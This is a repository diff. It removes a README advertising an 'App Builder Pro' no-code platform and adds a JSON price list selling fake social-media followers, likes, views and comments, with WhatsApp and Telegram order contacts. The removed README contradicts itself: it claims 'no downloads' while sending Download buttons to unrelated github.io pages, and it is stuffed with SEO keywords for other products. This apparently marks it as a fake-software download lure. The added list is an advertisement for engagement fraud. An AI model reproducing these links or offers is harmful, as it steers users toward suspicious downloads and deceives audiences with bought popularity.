@@ -1,79 +1,138 @@
-# App Builder Pro Platform
-
-App Builder Pro is an intuitive drag-and-drop platform to build mobile and web applications without writing code. Ideal for startups, businesses, and creators looking to launch cross-platform apps quickly.
-
-[![Download App Builder Pro](https://img.shields.io/badge/Download-App_Builder_Pro-blueviolet)](https://appbuilder-download-tool.github.io/.github/)
-
----
-
-### 🎯 Key Features
-
-- ✅ Visual drag-and-drop app editor  
-- ✅ No-code/low-code mobile & web development  
-- ✅ Ready-to-use templates and UI components  
-- ✅ Cross-platform: Android, iOS, Web  
-- ✅ API integration & data bindings  
-- ✅ Real-time preview and live publishing
-
----
-
-### 🛡 Why Choose It?
-
-- No programming required — build apps visually  
-- Fast deployment and instant changes  
-- Compatible with major platforms  
-- Cloud-based editor, no installation needed  
-- Seamless integration with external tools
-
----
-
-### 🧪 Usage Examples
-
-- Launch an Android app for your business in minutes  
-- Create an online store or portfolio app  
-- Build internal tools with data-driven workflows  
-- Prototype and test app ideas visually
-
----
-
-### 🏆 Benefits
-
-- Save development time and cost  
-- Empower non-technical users to create apps  
-- Deploy apps faster with built-in tools  
-- Maintain full control with custom logic support
-
----
-
-### 🔐 Safety & Privacy
-
-- 100% browser-based, no downloads  
-- Secure authentication and data encryption  
-- Works with OAuth2, REST APIs, and databases  
-- No hidden tracking or telemetry
-
----
-
-[![Download App Builder Pro](https://img.shields.io/badge/Download-App_Builder_Pro-blueviolet)](https://asdeennerhorse.github.io/mogus/AppBuilder)
-
----
-
-### 🖼 Preview
-
-![App Builder Editor](https://docs.8base.com/assets/images/app-builder-editor-1-c314fbf1be2b1635e887fa2ae4f76b3d.png)
-
-![App Templates](https://storage.googleapis.com/sales.appinst.io/2025/05/CMS-Templates.webp)
-
----
-
-### 🔍 SEO Keywords
-
-`app builder`, `app creator free`, `mobile app builder`, `best no code app builder`,  
-`low code app builder`, `build app`, `no code web app builder`, `best app builder`,  
-`appy pie app builder`, `drag and drop app builder`, `no code mobile app builder`,  
-`app maker online`, `android app maker`, `google app maker`, `jotform app`,  
-`app builder without coding`, `bubble app builder`, `free app builder without coding`,  
-`best free app builder`, `mobile app creator`, `free app maker without coding`,  
-`android app builder`, `google app maker free`, `android app creator`,  
-`glide app builder`, `app maker without coding`, `cross platform app development`,  
-`no code app builder free`, `ai app creator`, `online app builder`
+{
+  "app_name": "SOCIAL MEDIA BOOST",
+  "services": [
+    {
+      "platform": "Instagram",
+      "categories": [
+        {
+          "service": "Followers",
+          "packages": [
+            {"name": "100 Followers", "price": "₹20"},
+            {"name": "1K Followers", "price": "₹130"},
+            {"name": "10K Followers", "price": "₹1299"},
+            {"name": "100K Followers", "price": "₹12999"}
+          ]
+        },
+        {
+          "service": "Views",
+          "packages": [
+            {"name": "2K Views", "price": "₹2"},
+            {"name": "10K Views", "price": "₹10"},
+            {"name": "50K Views", "price": "₹50"},
+            {"name": "100K Views", "price": "₹100"},
+            {"name": "500K Views", "price": "₹450"},
+            {"name": "1M Views", "price": "₹650"}
+          ]
+        },
+        {
+          "service": "Likes",
+          "packages": [
+            {"name": "1K Likes", "price": "₹50"},
+            {"name": "10K Likes", "price": "₹459"},
+            {"name": "100K Likes", "price": "₹3999"}
+          ]
+        },
+        {
+          "service": "Comments",
+          "packages": [
+            {"name": "200 Comments", "price": "₹20"},
+            {"name": "1K Comments", "price": "₹150"}
+          ]
+        },
+        {
+          "service": "Repost",
+          "packages": [
+            {"name": "100 Repost", "price": "₹24"},
+            {"name": "1K Repost", "price": "₹300"}
+          ]
+        },
+        {
+          "service": "Share",
+          "packages": [
+            {"name": "1K Share", "price": "₹25"},
+            {"name": "10K Share", "price": "₹250"}
+          ]
+        }
+      ]
+    },
+    {
+      "platform": "Telegram",
+      "categories": [
+        {
+          "service": "Subscribers",
+          "packages": [
+            {"name": "1K Subscriber", "price": "₹70"},
+            {"name": "5K Subscriber", "price": "₹650"},
+            {"name": "10K Subscriber", "price": "₹1300"}
+          ]
+        },
+        {
+          "service": "Views",
+          "packages": [
+            {"name": "1K Views", "price": "₹5"},
+            {"name": "10K Views", "price": "₹35"},
+            {"name": "100K Views", "price": "₹300"}
+          ]
+        }
+      ]
+    },
+    {
+      "platform": "YouTube",
+      "categories": [
+        {
+          "service": "Subscribers",
+          "packages": [
+            {"name": "100 Subscriber", "price": "₹20"},
+            {"name": "1K Subscriber", "price": "₹200"}
+          ]
+        },
+        {
+          "service": "Views + Likes Package",
+          "packages": [
+            {"name": "10K Views + 500 Likes", "price": "₹199"}
+          ]
+        }
+      ]
+    },
+    {
+      "platform": "Facebook",
+      "categories": [
+        {
+          "service": "Followers",
+          "packages": [
+            {"name": "1K Followers", "price": "₹160"},
+            {"name": "5K Followers", "price": "₹800"},
+            {"name": "10K Followers", "price": "₹1299"}
+          ]
+        },
+        {
+          "service": "Views",
+          "packages": [
+            {"name": "1K Views", "price": "₹15"},
+            {"name": "10K Views", "price": "₹35"},
+            {"name": "100K Views", "price": "₹350"}
+          ]
+        },
+        {
+          "service": "Likes",
+          "packages": [
+            {"name": "100 Likes", "price": "₹5"},
+            {"name": "1K Likes", "price": "₹50"},
+            {"name": "10K Likes", "price": "₹499"}
+          ]
+        },
+        {
+          "service": "Comments",
+          "packages": [
+            {"name": "100 Comments", "price": "₹20"},
+            {"name": "1K Comments", "price": "₹99"}
+          ]
+        }
+      ]
+    }
+  ],
+  "order_links": {
+    "whatsapp": "https://wa.me/919486635955",
+    "telegram": "https://t.me/zxleoyt"
+  }
+}<img width="1024" height="1024" alt="file_0000000015ec71faa9eb30061716ccbf" src="https://github.com/user-attachments/assets/c778f3cb-ad6b-41bd-b2f6-7710ca6d8d26" />
